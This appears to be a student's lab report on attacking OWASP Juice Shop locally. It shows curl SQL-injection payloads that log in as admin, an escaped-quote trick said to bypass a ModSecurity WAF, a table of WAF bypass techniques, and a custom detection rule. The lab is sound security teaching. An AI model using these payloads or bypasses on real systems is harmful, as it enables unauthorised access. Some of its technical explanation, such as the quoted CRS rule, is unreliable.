@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>lab5-solution.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<h1 id="lab-5---web-application-firewall-waf">Lab 5 - Web Application Firewall (WAF)</h1>
+<h4 id="name--yehia-sobeh">NAME : YEHIA SOBEH</h4>
+<h2 id="%E2%9C%85-task-1-deploy--attack-juice-shop">✅ Task 1: Deploy &amp; Attack Juice Shop</h2>
+<p>🛠 Step-by-Step Overview:</p>
+<h3 id="%F0%9F%94%B9-step-1-pull-and-run-juice-shop">🔹 Step 1: Pull and Run Juice Shop</h3>
+<pre class="hljs"><code><div>docker pull bkimminich/juice-shop
+</div></code></pre>
+<pre class="hljs"><code><div>docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop
+</div></code></pre>
+<h3 id="%F0%9F%94%B9-step-2-sql-injection-via-curl">🔹 Step 2: SQL Injection via curl</h3>
+<pre class="hljs"><code><div>curl -X POST http://localhost:3000/rest/user/login \
+  -H <span class="hljs-string">"Content-Type: application/json"</span> \
+  --data <span class="hljs-string">'{"email":"'</span>\<span class="hljs-string">''</span> OR 1=1--<span class="hljs-string">", "</span>password<span class="hljs-string">":"</span>any-password<span class="hljs-string">"}'
+</span></div></code></pre>
+<p>🟢 Token:</p>
+<pre class="hljs"><code><div>{<span class="hljs-attr">"authentication"</span>:{<span class="hljs-attr">"token"</span>:<span class="hljs-string">"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDQtMTIgMTc6MTU6NTEuNzAwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDQtMTIgMTc6MTU6NTEuNzAwICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc0NDQ3ODE2NH0.A95S0Zf7L5dNyN0Fcwz9SGi_ayrP4zPMNn0QzmVh_BD3ayMIpBU1nfn6l6zscLtxRPYmL5V1UyvKGNyotwm_ysFXAsAkxSiJJiwc6wmYvNJ604eTmo8JndHHL9d-P-F5wGUWvrtoZh0JF6mmU3AvLCsuHK-VltuEgOq1NqqzGKQ"</span>,<span class="hljs-attr">"bid"</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">"umail"</span>:<span class="hljs-string">"admin@juice-sh.op"</span>}}
+</div></code></pre>
+<p>✅ Successfully bypassed login using classic ' OR 1=1-- SQLi.</p>
+<h3 id="%F0%9F%94%B9-step-3-admin-access">🔹 Step 3: Admin Access</h3>
+<p>Used the returned token to access:</p>
+<pre class="hljs"><code><div>curl -v -H <span class="hljs-string">"Authorization: Bearer &lt;TOKEN&gt;"</span> \
+  http://localhost:3000/rest/user/authentication-details/ -o admin_access.html
+</div></code></pre>
+<p>✅ Returned a list of users. Proof of admin privileges.</p>
+<h3 id="%F0%9F%94%B9-step-4-cleanup">🔹 Step 4: Cleanup</h3>
+<pre class="hljs"><code><div>docker stop juice-shop &amp;&amp; docker rm juice-shop
+</div></code></pre>
+<p><img src="screnshoots/1.1/1.png" alt="">
+<img src="screnshoots/1.1/1.png" alt="">
+<img src="screnshoots/1.1/3.png" alt="">
+<img src="screnshoots/1.1/4.png" alt="">
+<img src="screnshoots/1.1/5.png" alt="">
+<img src="screnshoots/1.1/6.png" alt="">
+<img src="screnshoots/1.1/7.png" alt="">
+<img src="screnshoots/1.1/8.png" alt="">
+<img src="screnshoots/1.1/9.png" alt="">
+<img src="screnshoots/1.1/10.png" alt="">
+<img src="screnshoots/1.1/11.png" alt=""></p>
+<h2 id="%F0%9F%A7%B1-task-1-expanded-using-waf-with-docker-compose">🧱 Task 1 (Expanded): Using WAF with docker-compose</h2>
+<p>extended it by placing Juice Shop behind a WAF (ModSecurity) using OWASP CRS:</p>
+<pre class="hljs"><code><div>
+<span class="hljs-comment"># docker-compose.yml </span>
+<span class="hljs-attr">services:</span>
+  <span class="hljs-attr">juice-shop:</span>
+    <span class="hljs-attr">image:</span> <span class="hljs-string">bkimminich/juice-shop</span>
+    <span class="hljs-attr">networks:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>
+    <span class="hljs-attr">ports:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">"3000:3000"</span>
+
+  <span class="hljs-attr">modsecurity:</span>
+    <span class="hljs-attr">image:</span> <span class="hljs-string">owasp/modsecurity-crs:nginx</span>
+    <span class="hljs-attr">environment:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">BACKEND=http://juice-shop:3000</span>
+    <span class="hljs-attr">ports:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">"8080:8080"</span>
+
+    <span class="hljs-attr">networks:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>
+
+
+<span class="hljs-attr">networks:</span>
+  <span class="hljs-attr">app-network:</span>
+    <span class="hljs-attr">driver:</span> <span class="hljs-string">bridge</span>
+</div></code></pre>
+<pre class="hljs"><code><div>docker compose up -d
+</div></code></pre>
+<pre class="hljs"><code><div>curl -X POST http://localhost:3000/rest/user/login \
+  -H <span class="hljs-string">"Content-Type: application/json"</span> \
+  --data <span class="hljs-string">'{"email":"'</span>\<span class="hljs-string">''</span> OR 1=1--<span class="hljs-string">", "</span>password<span class="hljs-string">":"</span>any-password<span class="hljs-string">"}'
+</span></div></code></pre>
+<p>🧪 Behavior Comparison:
+Port 3000 (direct): SQLi ' OR 1=1-- succeeds ✅</p>
+<p>🟢 Token:</p>
+<pre class="hljs"><code><div>{<span class="hljs-attr">"authentication"</span>:{<span class="hljs-attr">"token"</span>:<span class="hljs-string">"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDQtMTIgMTc6Mzg6MDYuNDYwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDQtMTIgMTc6Mzg6MDYuNDYwICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc0NDQ3OTU0M30.Bb7GoHWd2MIqifvgbG2vExLKbOigNfvA8rtEzIcr25ddLScvjHLRYfnPcIXXf3MoBQxoIIxUM57P8JUQISGdoXeQUTlctzl8ruyxherUuTL_LMka3xcQlCTo22lqyFlzHKwvdiPGrwm2rSpuHrbCr-80gJAsqXaBSab4Z4ntldI"</span>,<span class="hljs-attr">"bid"</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">"umail"</span>:<span class="hljs-string">"admin@juice-sh.op"</span>}}
+
+</div></code></pre>
+<pre class="hljs"><code><div>curl -X POST http://localhost:8080/rest/user/login   -H
+ <span class="hljs-string">"Content-Type: application/json"</span>   --data <span class="hljs-string">'{"email":"'</span>\<span class="hljs-string">''</span> OR 1=1--<span class="hljs-string">", "</span>password<span class="hljs-string">":"</span>any-password<span class="hljs-string">"}'
+
+</span></div></code></pre>
+<p>🟢 Response:</p>
+<pre class="hljs"><code><div><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>403 Forbidden<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>403 Forbidden<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span>nginx<span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+```bash
+
+</div></code></pre>
+<p>Port 8080 (WAF): SQLi ' OR 1=1-- blocked ❌ (HTTP 403)</p>
+<p>🧾 Verified WAF logs:</p>
+<pre class="hljs"><code><div>docker-compose logs modsecurity | grep <span class="hljs-string">'ModSecurity'</span>
+</div></code></pre>
+<!-- Confirmed the block by CRS rule 942100 using libinjection and pattern matching. -->
+<p><img src="screnshoots/1.2/1.png" alt="">
+<img src="screnshoots/1.2/2.png" alt="">
+<img src="screnshoots/1.2/3.png" alt="">
+<img src="screnshoots/1.2/4.png" alt="">
+<img src="screnshoots/1.2/5.png" alt=""></p>
+<hr>
+<h2 id="%E2%9C%85-task-2-explain-how--or-11---bypasses-the-waf">✅ Task 2: Explain How ' OR 1=1-- Bypasses the WAF</h2>
+<h3 id="%F0%9F%A7%A0-1-understanding-the-waf-modsecurity-with-crs">🧠 1. Understanding the WAF (ModSecurity with CRS)</h3>
+<p>The WAF (Web Application Firewall) inspects incoming requests before they reach the application. It uses regex patterns and libinjection to detect attacks like SQL injection.</p>
+<p>Example rule from CRS:</p>
+<pre class="hljs"><code><div><span class="hljs-attribute">SecRule</span> ARGS <span class="hljs-string">"@rx ' OR 1=1"</span> <span class="hljs-string">"id:942100,deny,status:403"</span>
+</div></code></pre>
+<p>This rule will only match payloads containing:</p>
+<pre class="hljs"><code><div>
+<span class="hljs-comment">' OR 1=1</span>
+<span class="hljs-keyword">If</span> you escape the quote <span class="hljs-keyword">like</span> \<span class="hljs-comment">', the pattern won't match.</span>
+</div></code></pre>
+<h3 id="%F0%9F%AA%84-2-why---bypasses-detection">🪄 2. Why \ ' Bypasses Detection</h3>
+<p>📍WAF Layer:
+Sees this payload:</p>
+<pre class="hljs"><code><div>{<span class="hljs-attr">"email"</span>:<span class="hljs-string">"\\' OR 1=1--"</span>, <span class="hljs-attr">"password"</span>:<span class="hljs-string">"x"</span>}
+Parses it as:
+\' OR <span class="hljs-number">1</span>=<span class="hljs-number">1</span>--
+</div></code></pre>
+<p>Interprets the quote as escaped, so it doesn't match the pattern ' OR 1=1.</p>
+<p>📍App Layer:
+Many web frameworks or legacy PHP apps apply automatic backslash stripping (e.g., stripslashes()).</p>
+<p>The payload becomes:
+' OR 1=1--</p>
+<p>Which is a valid SQLi payload.</p>
+<p>🔥 Result:
+SQL Injection bypasses WAF filtering and successfully authenticates as admin.</p>
+<h3 id="%F0%9F%94%AC-3-demonstration">🔬 3. Demonstration</h3>
+<p>✅ Successful Bypass Using curl:</p>
+<pre class="hljs"><code><div>curl -v -X POST http://localhost:8080/rest/user/login \
+  -H <span class="hljs-string">"Content-Type: application/json"</span> \
+  -d <span class="hljs-string">'{"email":"\\'</span>\<span class="hljs-string">''</span> OR 1=1--<span class="hljs-string">", "</span>password<span class="hljs-string">":"</span>x<span class="hljs-string">"}'
+</span></div></code></pre>
+<p>🟢 Response:</p>
+<pre class="hljs"><code><div>&lt; HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK
+&lt; Server: nginx
+&lt; Date: Sat, <span class="hljs-number">12</span> Apr <span class="hljs-number">2025</span> <span class="hljs-number">18</span>:<span class="hljs-number">01</span>:<span class="hljs-number">26</span> GMT
+&lt; Content-Type: application/json; charset=utf<span class="hljs-number">-8</span>
+&lt; Content-Length: <span class="hljs-number">811</span>
+&lt; Connection: keep-alive
+&lt; Access-Control-Allow-Origin: *
+&lt; X-Content-Type-Options: nosniff
+&lt; X-Frame-Options: SAMEORIGIN
+&lt; Feature-Policy: payment 'self'
+&lt; X-Recruiting: /#/jobs
+&lt; ETag: W/<span class="hljs-string">"32b-hxgLnFSjsA7X5Bv41iu/kfLnYxk"</span>
+&lt; Vary: Accept-Encoding
+&lt; Access-Control-Allow-Headers: *
+&lt; 
+* Connection #<span class="hljs-number">0</span> to host localhost left intact
+{<span class="hljs-attr">"authentication"</span>:{<span class="hljs-attr">"token"</span>:<span class="hljs-string">"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDQtMTIgMTc6NDM6MDYuNTcwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDQtMTIgMTc6NDQ6MTUuNDMyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc0NDQ4MDg4N30.xKtdCkAlBQiEUzXPEphC50ts99ayZhrv5vi8GQZNQAHfFS89wkEeQw_eW6gXWHaFnKBVZsMuCTJTJH7YPdy4RKnCUrw1NMwORvgdqa9MgyGCujVndqS05cHw8MIBnJdgqQLNS08uyQaeTAHwtBq80OWdjkSayvNWJW2fMFhpXRA"</span>,<span class="hljs-attr">"bid"</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">"umail"</span>:<span class="hljs-string">"admin@juice-sh.op"</span>}}
+</div></code></pre>
+<p>🔹 Step 3: Admin Access
+Used the returned token to access:</p>
+<pre class="hljs"><code><div>curl -v -H <span class="hljs-string">"Authorization: Bearer &lt;TOKEN&gt;"</span> \
+  http://localhost:8080/rest/user/authentication-details/ -o bypass_waf.html
+</div></code></pre>
+<p>🟢 Response:</p>
+<pre class="hljs"><code><div>&lt; HTTP/1.1 200 OK
+&lt; Server: nginx
+&lt; Date: Sat, 12 Apr 2025 18:05:11 GMT
+&lt; Content-Type: application/json; charset=utf-8
+&lt; Content-Length: 7860
+&lt; Connection: keep-alive
+&lt; Access-Control-Allow-Origin: *
+&lt; X-Content-Type-Options: nosniff
+&lt; X-Frame-Options: SAMEORIGIN
+&lt; Feature-Policy: payment <span class="hljs-string">'self'</span>
+&lt; X-Recruiting: /<span class="hljs-comment">#/jobs</span>
+&lt; ETag: W/<span class="hljs-string">"1eb4-k/eHBz/1LX3ocx7sOYt9+6ft3fU"</span>
+&lt; Vary: Accept-Encoding
+&lt; Access-Control-Allow-Headers: *
+&lt; 
+{ [7860 bytes data]
+100  7860  100  7860    0     0   367k      0 --:--:-- --:--:-- --:--:--  383k
+* Connection <span class="hljs-comment">#0 to host localhost left intact</span>
+</div></code></pre>
+<p>Contains a valid JWT token for the admin user.</p>
+<h3 id="%F0%9F%94%8D-4-why-this-works-technically">🔍 4. Why This Works (Technically)</h3>
+<p>Layer	Input Seen	Action Taken
+WAF	' OR 1=1--	Escaped quote → doesn't match regex → allowed
+App	' OR 1=1-- (after stripping)	Valid SQL → admin login → returns token
+🧱 5. Other Common Bypass Techniques
+Technique	Example	Notes
+Escaped characters	', &quot;	Bypass basic regex patterns
+Unicode encoding	%27 OR 1=1--	%27 = '
+Double URL encoding	%255C%27 OR 1=1--	%255C → %5C → <br>
+Case variation	' oR 1=1--	Not all WAFs are case-insensitive
+JSON nested injection	JSON inside JSON (e.g., APIs)	Many WAFs poorly handle JSON
+🧹 6. Mitigation Tips
+✅ Use parameterized queries (prepared statements).</p>
+<p>🔒 Apply WAF with context-aware parsers (e.g., JSON parsers for API endpoints).</p>
+<p>🛡️ Enable WAF logging and tuning to catch obfuscated payloads.</p>
+<p>🚫 Avoid relying solely on regex patterns for detection.</p>
+<p>✅ Conclusion
+' bypasses the WAF because escaping changes how the input is interpreted.</p>
+<p>WAF sees escaped quotes, while the application sees unescaped input — leading to successful SQLi.</p>
+<p>Proper backend sanitization and WAF tuning are essential to mitigate such attacks.</p>
+<p><img src="screnshoots/2.1/1.png" alt="">
+<img src="screnshoots/2.1/2.png" alt="">
+<img src="screnshoots/2.1/3.png" alt="">
+<img src="screnshoots/2.1/4.png" alt="">
+<img src="screnshoots/2.1/5.png" alt=""></p>
+<hr>
+<h2 id="%F0%9F%9B%A1%EF%B8%8F-task-2-%E2%80%93-part-2-adding-a-custom-modsecurity-rule-in-dockerized-owasp-crs">🛡️ Task 2 – Part 2: Adding a Custom ModSecurity Rule in Dockerized OWASP CRS</h2>
+<p>This part involves creating a custom Web Application Firewall (WAF) rule to detect and block simple SQL injection attempts in a containerized OWASP ModSecurity Core Rule Set (CRS) environment.</p>
+<h3 id="%E2%9C%85-step-1-create-custom-rule-file">✅ Step 1: Create Custom Rule File</h3>
+<p>Create a file named custom-rules.conf with the following rule definition:</p>
+<pre class="hljs"><code><div>cat &lt;&lt;EOF &gt; custom-rules.conf
+SecRule REQUEST_BODY|ARGS|ARGS_NAMES|REQUEST_URI|REQUEST_HEADERS \
+    <span class="hljs-string">"@rx (?i)(\\\\)?['\"]\s*OR\s*1=1\s*--"</span> \
+    <span class="hljs-string">"id:1005,\
+    phase:2,\
+    deny,\
+    status:403,\
+    msg:'Custom SQLi Rule',\
+    chain"</span>
+    SecRule REQUEST_HEADERS:Content-Type <span class="hljs-string">"application/json"</span>
+EOF
+</div></code></pre>
+<p>Purpose: This rule matches a classic SQL injection pattern and only triggers if the Content-Type is application/json.</p>
+<h3 id="%F0%9F%90%B3-step-2-update-docker-configuration">🐳 Step 2: Update Docker Configuration</h3>
+<p>Modify docker-compose.yml to mount your custom rule file:</p>
+<pre class="hljs"><code><div><span class="hljs-attr">services:</span>
+  <span class="hljs-attr">modsecurity:</span>
+    <span class="hljs-attr">image:</span> <span class="hljs-string">owasp/modsecurity-crs:nginx</span>
+    <span class="hljs-attr">volumes:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">./custom-rules.conf:/etc/modsecurity.d/owasp-crs/rules/custom-rules.conf:ro</span>
+    <span class="hljs-attr">environment:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">BACKEND=http://juice-shop:3000</span>
+    <span class="hljs-attr">ports:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">"8080:8080"</span>
+</div></code></pre>
+<p>🔒 Use :ro to ensure the rule file is read-only within the container.
+📁 Rules must be mounted in: /etc/modsecurity.d/owasp-crs/rules/</p>
+<p>🔁 Step 3: Automatic Inclusion
+No manual Include is needed — CRS automatically loads all .conf files in the rules/ directory:</p>
+<pre class="hljs"><code><div><span class="hljs-comment"># Already included in CRS:</span>
+<span class="hljs-attribute">Include</span> /etc/modsecurity.d/owasp-crs/rules/*.conf
+</div></code></pre>
+<h3 id="%F0%9F%A7%AA-step-4-test-the-configuration">🧪 Step 4: Test the Configuration</h3>
+<p>Restart the containers and send a test SQLi payload:</p>
+<pre class="hljs"><code><div><span class="hljs-comment"># Restart containers</span>
+docker-compose down &amp;&amp; docker-compose up -d
+</div></code></pre>
+<pre class="hljs"><code><div><span class="hljs-comment"># Test with curl</span>
+curl -v http://localhost:8080/rest/user/login \
+  -H <span class="hljs-string">"Content-Type: application/json"</span> \
+  -d <span class="hljs-string">'{"email":"\\'</span>\<span class="hljs-string">''</span> OR 1=1--<span class="hljs-string">", "</span>password<span class="hljs-string">":"</span>x<span class="hljs-string">"}'
+</span></div></code></pre>
+<p>🟢 Response:</p>
+<pre class="hljs"><code><div><span class="hljs-tag">&lt; <span class="hljs-attr">HTTP</span>/<span class="hljs-attr">1.1</span> <span class="hljs-attr">403</span> <span class="hljs-attr">Forbidden</span>
+&lt; <span class="hljs-attr">Server:</span> <span class="hljs-attr">nginx</span>
+&lt; <span class="hljs-attr">Date:</span> <span class="hljs-attr">Sat</span>, <span class="hljs-attr">12</span> <span class="hljs-attr">Apr</span> <span class="hljs-attr">2025</span> <span class="hljs-attr">19:56:29</span> <span class="hljs-attr">GMT</span>
+&lt; <span class="hljs-attr">Content-Type:</span> <span class="hljs-attr">text</span>/<span class="hljs-attr">plain</span>
+&lt; <span class="hljs-attr">Content-Length:</span> <span class="hljs-attr">146</span>
+&lt; <span class="hljs-attr">Connection:</span> <span class="hljs-attr">keep-alive</span>
+&lt; <span class="hljs-attr">Access-Control-Allow-Origin:</span> *
+&lt; <span class="hljs-attr">Access-Control-Max-Age:</span> <span class="hljs-attr">3600</span>
+&lt; <span class="hljs-attr">Access-Control-Allow-Methods:</span> <span class="hljs-attr">GET</span>, <span class="hljs-attr">POST</span>, <span class="hljs-attr">PUT</span>, <span class="hljs-attr">DELETE</span>, <span class="hljs-attr">OPTIONS</span>
+&lt; <span class="hljs-attr">Access-Control-Allow-Headers:</span> *
+&lt; 
+&lt;<span class="hljs-attr">html</span>&gt;</span>
